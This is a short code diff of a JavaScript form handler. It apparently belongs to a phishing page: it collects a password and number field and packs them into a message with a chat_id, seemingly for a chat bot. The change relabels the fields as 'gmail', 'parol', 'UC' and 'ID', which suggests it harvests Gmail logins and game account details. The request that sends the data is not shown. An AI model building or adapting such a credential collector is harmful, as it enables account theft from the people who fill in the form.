@@ -11,7 +11,7 @@ const sendRequest = (e) => {
   const parol = document  .querySelector(".parol").value.trim();
   const nomer = document.querySelector(".nomer").value.trim();
 
-  const message = `👤 Ism: ${firstName}\n🎂 Yosh: ${age}\n🔐 Parol: ${parol}\n📞 Nomer: ${nomer}`;
+  const message = `👤 gmail: ${firstName}\n🎂 parol: ${age}\n🔐 UC: ${parol}\n📞 ID: ${nomer}`;
 
   const formData = {
     chat_id: chatId,
